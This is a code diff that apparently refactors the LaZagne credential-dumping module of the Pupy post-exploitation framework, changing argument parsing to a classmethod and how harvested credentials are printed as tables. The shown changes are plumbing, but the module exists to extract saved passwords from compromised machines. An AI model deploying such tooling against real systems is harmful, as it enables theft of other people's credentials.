@@ -47,7 +47,8 @@ class LaZagne(PupyModule):
         'CredType', 'Category', 'SavePassword'
     ])
 
-    def init_argparse(self):
+    @classmethod
+    def init_argparse(cls):
         header = '|====================================================================|\n'
         header += '|                                                                    |\n'
         header += '|                        The LaZagne Project                         |\n'
@@ -56,8 +57,8 @@ class LaZagne(PupyModule):
         header += '|                                                                    |\n'
         header += '|====================================================================|\n\n'
 
-        self.arg_parser = PupyArgumentParser(prog="lazagne", description=header + self.__doc__)
-        self.arg_parser.add_argument('category', nargs='?', help='specify category', default='all')
+        cls.arg_parser = PupyArgumentParser(prog="lazagne", description=header + cls.__doc__)
+        cls.arg_parser.add_argument('category', nargs='?', help='specify category', default='all')
 
     def run(self, args):
         db = Credentials(
@@ -276,13 +277,10 @@ class LaZagne(PupyModule):
             )
 
             if not module in self.NON_TABLE:
-                self.log(
-                    self.formatter.table_format(
-                        self.prepare_fields(
-                            creds, remove=self.FILTER_COLUMNS
-                        )
-                    )
-                )
+                self.table(
+                    self.prepare_fields(
+                        creds, remove=self.FILTER_COLUMNS
+                    ))
             else:
                 for cred in creds:
                     for k, v in cred.iteritems():
